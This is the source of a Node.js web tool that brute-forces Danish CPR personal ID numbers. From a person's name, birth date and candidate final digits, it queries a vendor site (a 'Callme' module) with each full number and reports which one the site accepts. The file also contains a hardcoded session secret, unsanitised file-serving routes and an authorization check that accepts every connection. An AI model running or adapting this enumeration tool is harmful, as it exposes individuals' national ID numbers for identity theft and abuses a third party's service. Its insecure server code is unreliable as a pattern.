var kutils = require("./utils/konUtils.js"),
	Curl = require("./utils/Curl.js"),	  
	
	// npm modules
	express = require('express'),
	app = express.createServer(),	
  io = require('socket.io'),		
	$ = require("jquery"),	  
	querystring = require("querystring"),
	Step = require("step"),		
	
	// Session handling
  MemoryStore = express.session.MemoryStore,    
  sessionStore = new MemoryStore(),
  Session = require('connect').middleware.session.Session,
	parseCookie = require('connect').utils.parseCookie;     
	
// prepare session (cookie) handling
app.configure(function () {
	app.use(express.cookieParser());
	app.use(express.session({store: sessionStore, secret: 'secret', key: 'express.sid'}));
});	
	
// start webserver and sockets
app.listen(3000);
var sio = io.listen(app);
sio.set('log level', 1); 


/*
 * Web server routing
 ******************************************/

// pass arguments
app.use(express.bodyParser());

// pass html requests
app.get('/*.html', function(req, res){
  res.sendfile(__dirname + '/pages/'+ req.url);
});

// pass html requests
app.get('/js/*', function(req, res){
  res.sendfile(__dirname + req.url);
});

// pass html requests
app.get('/css/*', function(req, res){
  res.sendfile(__dirname + req.url);
});

// pass html requests
app.get('/images/*', function(req, res){
  res.sendfile(__dirname + req.url);
});

// receive request from frontend
app.get('/', function(req, res){
  res.sendfile(__dirname + '/pages/index.html');
});


/*
 * Sockets
 ******************************************/

// authentication
sio.sockets.on('connection', function (socket) {

	sio.set('authorization', function (data, callback) {
	  if (data.headers.cookie) {
	  
	  	// parse headers -> parse cookie -> get sessionID to retrieve the entire session later
			data.cookie = parseCookie(data.headers.cookie);
			data.sessionID = data.cookie['express.sid'];			    
      data.sessionStore = sessionStore;
			
			console.log('A socket with sessionID ' + data.sessionID + ' connected!');		

			// get entire session
			sessionStore.get(data.sessionID, function (err, session) {
			
				// session error: refuse connection			
				if (err || !session) {
					callback('Error', false);
					
				// save the session data and accept the connection					
				} else {
					data.session = new Session(data, session);
					callback(null, true);
				}
			});			
		} else {
			// no cookie: refuse connection
			return callback('No cookie transmitted.', false);
		}
		// accept the incoming connection
		callback(null, true);
	});
});


// run for every new client reload
sio.sockets.on('connection', function (socket) {

	if(socket.handshake.session == undefined){
		console.log("Remember to reload browser AFTER node has restarted!");
	}

	// data from client
	var inputData = {};

	// receive inputs (name and birthday)
  socket.on('setInputData', function (data) {
	  socket.emit('msg', 'Received data ' + JSON.stringify(data));
		for(var key in data){
		  inputData[key] = data[key];
	  }

	  // Debuggin' ONLY: overwrite cpr numbers
	  //inputData["cprNumbers"] = new Array('1337', '1232', '1231');
 
 		// open handshake session
 		var currentSession = socket.handshake; 		
 		
 		if(socket.handshake.session.vendorBase == undefined){
 			// includes
			var vendorBase = require("./vendorBase.js"),	
					vendorSpecific = require("./vendors/Callme.js");
			
			// merge specific vendor and base
			$.extend(vendorBase.options, vendorSpecific.options);
			$.extend(vendorBase.data, vendorSpecific.data);
			$.extend(vendorBase.settings, vendorSpecific.settings);
			vendorBase.getResponse = vendorSpecific.getResponse;	  
				
			// update placeholder for name
			vendorBase.updatePlaceholders({
				firstName: inputData.firstName,
				lastName: inputData.lastName
			}, "name");
					
			// get vendor session cookie (not handshake session!!)
			if(typeof vendorSpecific.prepareRequest === 'function') {	  
				vendorSpecific.prepareRequest(function(cookie){	  
					vendorBase.options.cookie = cookie;
					init(inputData, socket, vendorBase);
				});
			}else{
				init(inputData, socket, vendorBase);		
			} 
			
			// add to session and save
			currentSession.vendorBase = vendorBase;
			currentSession.save();
		}else{
			var vendorBase = currentSession.vendorBase;
		}		
  });
});



/*
 * Start brute forcing
 ******************************************/

function init(inputData, socket, vendorBase){
	// iterate cpr numbers
	var cprNumbersTotal=inputData.cprNumbers.length;	
	for(var i=0; i<cprNumbersTotal; i++) {
	
		var vendorObj = $.extend(true, {}, vendorBase);
	
		// queueing requests
	  socket.emit('queueing');

		// update placeholders for cpr number
		var realCprNumber = inputData.dob + "" + inputData.cprNumbers[i];	
		vendorObj.updatePlaceholders(realCprNumber, "cpr");
		
		// set original cpr number (not formatted)
		vendorObj.settings.realCprNumber = realCprNumber;

		Step(
			// send request
			function step1(){
				console.log("Timeout 1");
				var req = {
					options: vendorObj.options,
					data: vendorObj.data,
					settings: vendorObj.settings
				};
				Curl.scrape(req, this);	
			},
			
			// get response from vendor and parse to vendorparser
			function step2(req, res){	
				console.log("Timeout 2");
									
				// connection error
				if(res.error !== undefined ){
					socket.emit('failed', req.settings.realCprNumber);						
					kutils.debug("Adding to retry", req.settings.realCprNumber, 1, "step2")
					console.log(res.error);
				// no connection errors
				}else{
					vendorObj.getResponse(req, res, this);
				}
			},
			
			// check response
			function step3(cpr, status){
				console.log("Timeout 3" + cpr);
			
				if(status == "success"){
					socket.emit('correctCPR', cpr);
					kutils.debug("Correct CPR", cpr, 2, "getResponse");
				}else{					
					socket.emit('incorrectCPR', cpr, status);
					//kutils.debug("Incorrect CPR", cpr + ' - ' + JSON.stringify(status), 2, "getResponse");
				}

				socket.emit('completed');
			}
		); // end step
	}	// end for loop
}
